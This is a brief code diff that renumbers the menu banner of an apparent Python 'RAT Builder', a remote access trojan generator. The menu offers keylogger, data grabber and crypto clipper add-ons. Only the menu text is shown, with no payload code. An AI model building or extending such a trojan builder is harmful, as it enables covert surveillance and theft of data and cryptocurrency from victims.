@@ -67,10 +67,9 @@ banner = Style.BRIGHT + f'''{Fore.LIGHTGREEN_EX}
            _/--\_         
    
 
-    {Fore.LIGHTGREEN_EX}1{Fore.RESET}.{Fore.CYAN} Create PayLoad
-    {Fore.LIGHTGREEN_EX}2{Fore.RESET}.{Fore.CYAN} Create Custom PayLoad
-    {Fore.LIGHTGREEN_EX}3{Fore.RESET}.{Fore.CYAN} Create Keylogger Add on
-    {Fore.LIGHTGREEN_EX}4{Fore.RESET}.{Fore.CYAN} Create Data Grabber Add on
-    {Fore.LIGHTGREEN_EX}5{Fore.RESET}.{Fore.CYAN} Create Crypto Clipper Add on
+    {Fore.LIGHTGREEN_EX}1{Fore.RESET}.{Fore.CYAN} Create Custom PayLoad
+    {Fore.LIGHTGREEN_EX}2{Fore.RESET}.{Fore.CYAN} Create Keylogger Add on
+    {Fore.LIGHTGREEN_EX}3{Fore.RESET}.{Fore.CYAN} Create Data Grabber Add on
+    {Fore.LIGHTGREEN_EX}4{Fore.RESET}.{Fore.CYAN} Create Crypto Clipper Add on
     {Fore.LIGHTGREEN_EX}420{Fore.RESET}.{Fore.LIGHTRED_EX} Exit RAT Builder
 {Fore.RESET}'''
